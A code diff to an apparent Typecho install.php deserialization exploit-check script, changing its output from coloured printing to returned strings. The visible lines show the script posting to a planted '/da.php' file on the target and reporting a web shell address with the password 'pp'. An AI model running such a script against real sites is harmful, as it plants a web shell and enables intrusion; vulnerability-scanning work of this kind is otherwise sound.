@@ -8,8 +8,8 @@ description: 漏洞产生在install.php中，base64后的值被反序列化和�
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class typecho_install_code_exec_BaseVerify:
     def __init__(self, url):
@@ -33,12 +33,12 @@ class typecho_install_code_exec_BaseVerify:
             }
             req1 = requests.post(self.url + "/da.php", data=post_data, headers=headers, timeout=10, verify=False)
             if r"Configuration File (php.ini) Path" in req1.text:
-                cprint("[+]存在typecho install.php反序列化命令执行漏洞...(高危)\tpayload: "+vulnurl+"\tshell地址: "+shellpath+"\t密码: pp", "red")
+                return "[+]存在typecho install.php反序列化命令执行漏洞...(高危)\tpayload: "+vulnurl+"\tshell地址: "+shellpath+"\t密码: pp"
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = typecho_install_code_exec_BaseVerify(sys.argv[1])
     testVuln.run()
